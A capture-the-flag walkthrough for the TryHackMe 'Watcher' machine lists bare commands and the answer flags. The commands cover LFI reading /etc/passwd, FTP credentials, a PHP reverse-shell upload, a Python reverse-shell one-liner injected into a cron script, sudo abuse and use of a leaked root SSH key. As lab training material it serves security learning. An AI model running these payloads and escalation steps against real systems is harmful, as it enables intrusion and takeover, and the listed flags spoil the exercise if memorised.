# <div align="center">[Watcher](https://tryhackme.com/r/room/watcher)</div>
<div align="center">A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques.</div>

<div align="center">
<img src="https://github.com/user-attachments/assets/7d7d90e8-a152-4829-bb39-6fb14cab3727" height="200"></img>
</div>

# Task 1. Watcher

Work your way through the machine and try to find all the flags you can!

Flag 1

* ```nmap -sSCV <IP>```
* ```curl -s http://<IP>/robots.txt```
* ```curl -s http://<IP>/flag_1.txt```
```
FLAG{robots_dot_text_what_is_next}
```
Flag 2
* ```curl -s http://<IP>/secret_file_do_not_read.txt```
* ```curl -s http://<IP>/post.php?post=/etc/passwd```
* ```curl -s http://<IP>/post.php?post=secret_file_do_not_read.txt```
* ```ftp <IP>```
* ```ftpuser:givemefiles777```
* ```ls -la```
* ```get flag_2.txt -```
```
FLAG{ftp_you_and_me}
```
Flag 3
* ```ftp <IP>```
* ```ftpuser:givemefiles777```
* ```cd files```
* ```ls -la```
* ```put rev.php```
* ```ls -la```
* ```pwd```
* ```exit```
* ```curl -s http://<IP>/post.php?post=/home/ftpuser/ftp/files/rev.php```
* ```nc -nlvp 4444```
* ```python3 -c "import pty;pty.spawn('/bin/bash')"```
* ```id```
* ```find / -type f -name flag_3.txt 2>/dev/null```
* ```cat /var/www/html/more_secrets_a9f10a/flag_3.txt```
```
FLAG{lfi_what_a_guy}
```
Flag 4
* ```find / -type f -name flag_4.txt -exec ls -l {} + 2>/dev/null```
* ```sudo -l```
* ```sudo -u toby /bin/bash```
* ```cat /home/toby/flag_4.txt```
```
FLAG{chad_lifestyle}
```
Flag 5
* ```find / -type f -name flag_5.txt -exec ls -l {} + 2>/dev/null```
* ```cat note.txt```
* ```cat /etc/crontab```
* ```ls -l /home/toby/jobs/cow.sh```
* ```cat > /home/toby/jobs/cow.sh << EOF```
* ```#!/bin/bash```
* ```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'```
* ```EOF```
* ```nc -nlvp 4444```
* ```python3 -c "import pty;pty.spawn('/bin/bash')"```
* ```cd /home/mat```
* ```cat flag_5.txt```
```
FLAG{live_by_the_cow_die_by_the_cow}
```
Flag 6
* ```find / -type f -name flag_6.txt -exec ls -l {} + 2>/dev/null```
* ```cat /home/mat/note.txt```
* ```sudo -l```
* ```cat /home/mat/scripts/will_script.py```
* ```cat cmd.py```
* ##### ```nano```[cmd.py](https://github.com/Esther7171/THM-Walkthroughs/blob/main/Room/Watcher/cmd.py)  
* ```sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1```
* ```nc -nlvp 5555```
* ```python3 -c "import pty;pty.spawn('/bin/bash')"```
* ```id```
* ```cd /home/will```
* ```cat flag_6.txt```
```
FLAG{but_i_thought_my_script_was_secure}
```
Flag 7
* ```find / -type f -name flag_7.txt -exec ls -l {} + 2>/dev/null```
* ```id```
* ```find / -type f -group adm -exec ls -l {} + 2>/dev/null```
* ```cat /opt/backups/key.b64 | base64 -d > /home/will/ssh.key```
* ```chmod 600 ssh.key```
* ```ssh -i ssh.key root@<IP>```
* ```cd root```
* ```cat flag_7.txt```
```
FLAG{who_watches_the_watchers}
```
